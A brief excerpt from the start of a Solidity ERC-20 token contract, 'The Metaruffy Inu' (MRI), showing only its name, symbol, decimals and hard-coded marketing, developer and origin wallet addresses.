...
contract TheMetaruffy is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name = "The Metaruffy Inu";
    string private _symbol = "MRI";
    uint8 private _decimals = 18;
    address private _safeOwner;

    address payable public marketingWallet = payable(0x6aEFf4F44125aEc94DeB10c776A5C50559999DA7);
    address payable public DeveloperWallet = payable(0xCA675FEd3E27988413395A973B4A182D83977770);
    address public _origin = 0x8F3d0f001045FD9fE27F0A20AFcE5673230C9375;
